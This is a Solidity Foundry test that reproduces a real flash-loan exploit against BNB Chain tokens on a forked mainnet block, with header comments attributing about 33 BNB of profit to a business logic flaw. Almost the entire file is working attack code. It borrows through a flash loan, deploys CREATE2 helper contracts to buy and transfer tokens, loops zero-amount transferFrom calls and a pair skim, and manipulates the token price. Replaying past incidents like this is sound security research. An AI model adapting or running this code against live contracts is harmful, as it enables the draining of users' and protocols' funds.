// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";


// TX : https://phalcon.blocksec.com/explorer/tx/bsc/0x5446bf2b57749abdab01813a50ce36246177f3437599f3a56bc1554f596b2c3a
// GUY : https://x.com/SlowMist_Team/status/1795648617530995130
// Profit : ~33 bnb
// REASON : Business Logic Flaw

interface Boy is IERC20{
   function  getPrice() external returns (uint256);
}
contract ContractTest is Test {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x74f5FE81F67FA30A679d3547f7F9B97a2dd46BA5); 
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 Girl = IERC20(0xb1de93DAe1CDdF429eEc9DB30b78759d17495758);
    Boy boy = Boy(0xdf4895Cd8247284Ae3a7b3E28cf6c03113fADa5f);
    uint256 constant PRECISION = 10**18;
    address[] public Myaddress;
    function setUp() external {
        vm.createSelectFork("bsc", 39123756);
        // deal(address(BUSDT), address(this), 500000 ether);
    }
    function testExploit() external {
        emit log_named_decimal_uint("[End] Attacker bnb before exploit", address(this).balance, 18);
        Pool.flash(address(this),400000000000000000000000,0,"0x123");
        emit log_named_decimal_uint("[End] Attacker bnb after exploit", address(this).balance, 18);
        emit log_named_decimal_uint("[End] Attacker BUSDT after exploit", BUSDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker boy  after exploit", boy.balanceOf(address(this)), 18);

    }
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
      swap_token_to_token(address(BUSDT),address(Girl),1 ether);
       uint256 helpContractAmount = 10;
       uint256 i = 0;
        while(i < helpContractAmount){
            address money = cal_address(i);
            Myaddress.push(money);
            i ++;
        }
        create_contract(helpContractAmount);
        for(uint256 i=0;i<Myaddress.length;i++){
            address(Myaddress[i]).call{value: 3 ether}(abi.encodeWithSignature("buy()"));
            vm.roll(block.number+1);
            address(Myaddress[i]).call(abi.encodeWithSignature("send()"));
        }
        BUSDT.transfer(address(Pair),399000 ether);
        uint256 j=0;
        while(j<290){
        Girl.transferFrom(address(Pair),address(this),0);
        j++;
        }
        Pair.skim(address(this));
        Girl.transfer(address(this),1000000);
        console.log("price",boy.getPrice());
        boy.transfer(address(boy),25380992089360281325724);
        WBNB.deposit{value: 0.4 ether}();
        swap_token_to_token(address(WBNB),address(BUSDT),0.4 ether);
        BUSDT.transfer(msg.sender, 400000 * 1e18 + fee0);
    }
    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
    function cal_address(uint256 time) internal returns(address){
        bytes memory bytecode = type(Money).creationCode;
        uint256 _salt = time;
        bytecode = abi.encodePacked(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        address hack_contract =  address(uint160(uint256(hash)));
        return hack_contract;
    }
    function create_contract(uint256 times) internal {
        uint256 i = 0;
        while(i<times){
            bytes memory bytecode = type(Money).creationCode;
            uint256 _salt = i;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            // console.log(hack_contract);
            address addr;
            // Use create2 to send money first.
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            i ++;
        }
    }
function receive() public payable {}
  fallback() external payable {}
}
contract Money is Test{
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x74f5FE81F67FA30A679d3547f7F9B97a2dd46BA5); 
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 Girl = IERC20(0xb1de93DAe1CDdF429eEc9DB30b78759d17495758);
    IERC20 boy = IERC20(payable(0xdf4895Cd8247284Ae3a7b3E28cf6c03113fADa5f));
    uint256 constant PRECISION = 10**18;
    address owner;
    constructor() {
        owner = msg.sender;
    }
    function buy() public payable {
        address(boy).call{value : msg.value,gas: 20000000000}("");
    }
    function send()public {
        boy.transfer(address(msg.sender),boy.balanceOf(address(this)));
    }
    fallback() external payable {}
}